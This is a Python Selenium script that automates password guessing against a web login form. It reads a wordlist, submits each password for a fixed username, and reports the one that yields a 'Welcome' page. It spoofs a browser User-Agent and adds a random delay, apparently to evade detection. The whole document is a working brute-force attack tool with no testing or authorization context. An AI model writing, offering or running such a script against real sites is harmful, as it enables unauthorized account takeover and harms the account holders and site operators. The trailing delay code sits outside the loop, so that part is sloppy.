from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import time

# Set up Chrome options to use a custom User-Agent
chrome_options = Options()
chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36")

# Initialize Chrome WebDriver with options
driver = webdriver.Chrome(options=chrome_options)

def load_passwords(filename="passwords.txt"):
    with open(filename, "r") as file:
        return file.read().splitlines()

def test_passwords(url, username, password_file):
    driver.get(url)  # Open the login page
    passwords = load_passwords(password_file)

    for password in passwords:
        try:
            # Find the username and password input fields
            username_input = driver.find_element(By.NAME, "username")  # Adjust this selector
            password_input = driver.find_element(By.NAME, "password")  # Adjust this selector

            # Clear input fields and input credentials
            username_input.clear()
            password_input.clear()
            username_input.send_keys(username)
            password_input.send_keys(password)

            # Submit the form
            password_input.send_keys(Keys.RETURN)

            # Wait to see if login was successful
            time.sleep(2)

            if "Welcome" in driver.page_source:
                print(f"Password found: {password}")
                break
            else:
                print(f"Password failed: {password}")

        except Exception as e:
            print(f"An error occurred: {e}")

    driver.quit()

# Test the function
test_passwords("", "testuser", "passwords.txt")

import random
time.sleep(random.uniform(2, 5))  # Random delay between 2 and 5 seconds
